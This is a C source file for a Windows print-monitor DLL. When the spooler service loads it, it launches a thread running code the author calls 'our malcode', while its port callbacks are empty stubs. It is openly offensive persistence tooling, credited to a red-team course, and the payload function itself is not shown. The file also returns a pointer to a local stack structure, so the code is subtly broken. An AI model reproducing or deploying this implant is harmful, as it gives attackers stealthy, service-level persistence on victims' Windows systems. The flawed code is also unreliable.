#include "Gremlin.h"
#include <Winsplp.h>

#pragma comment(lib, "Winspool.lib")

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}

// Mandatory functions - Code credit goes to reenz0h@https://institute.sektor7.net/rto-windows-persistence
// ------------------------------------------------------------------------

BOOL WINAPI pfnOpenPort(HANDLE hMonitor, LPWSTR pName, PHANDLE pHandle){ return TRUE; }
BOOL WINAPI OpenPortEx(HANDLE hMonitor, HANDLE hMonitorPort, LPWSTR pPortName, LPWSTR pPrinterName, PHANDLE pHandle, struct _MONITOR2 *pMonitor){ return TRUE; }
BOOL (WINAPI pfnStartDocPort)(HANDLE hPort, LPWSTR pPrinterName, DWORD JobId, DWORD Level, LPBYTE pDocInfo) { return TRUE; }
BOOL WritePort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuf, LPDWORD pcbWritten){ return TRUE; }
BOOL ReadPort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuffer, LPDWORD pcbRead){ return TRUE; }
BOOL (WINAPI pfnEndDocPort)(HANDLE hPort) { return TRUE; }
BOOL ClosePort(HANDLE hPort){ return TRUE; }
BOOL XcvOpenPort(HANDLE hMonitor, LPCWSTR pszObject, ACCESS_MASK GrantedAccess, PHANDLE phXcv) { return TRUE; }
DWORD XcvDataPort(HANDLE hXcv, LPCWSTR pszDataName, PBYTE  pInputData, DWORD cbInputData, PBYTE  pOutputData, DWORD cbOutputData, PDWORD pcbOutputNeeded) { return ERROR_SUCCESS; }
BOOL XcvClosePort(HANDLE hXcv){ return TRUE; }
VOID (WINAPI pfnShutdown)(HANDLE hMonitor) { }
DWORD WINAPI pfnNotifyUsedPorts(HANDLE hMonitor,DWORD cPorts,PCWSTR *ppszPorts){ return ERROR_SUCCESS; }
DWORD WINAPI pfnNotifyUnusedPorts(HANDLE hMonitor,DWORD cPorts,PCWSTR *ppszPorts){ return ERROR_SUCCESS; }
DWORD WINAPI pfnPowerEvent(HANDLE hMonitor,DWORD event,POWERBROADCAST_SETTING *pSettings){ return ERROR_SUCCESS; }

// Function which gets called when port monitor DLL is loaded in spoolsv - Code credit goes to reenz0h@https://institute.sektor7.net/rto-windows-persistence
// ------------------------------------------------------------------------

LPMONITOR2 WINAPI InitializePrintMonitor2(PMONITORINIT pMonitorInit, PHANDLE phMonitor){
	// Launch our malcode in a separate thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) go, 0, 0, 0);
	
	MONITOR2 mon = {sizeof(MONITOR2), NULL, pfnOpenPort, OpenPortEx, pfnStartDocPort, WritePort, ReadPort, pfnEndDocPort, ClosePort, NULL, NULL, NULL, NULL, NULL, NULL, XcvOpenPort, XcvDataPort, XcvClosePort, pfnShutdown, NULL, pfnNotifyUsedPorts, pfnNotifyUnusedPorts, pfnPowerEvent };
	return &mon;
}
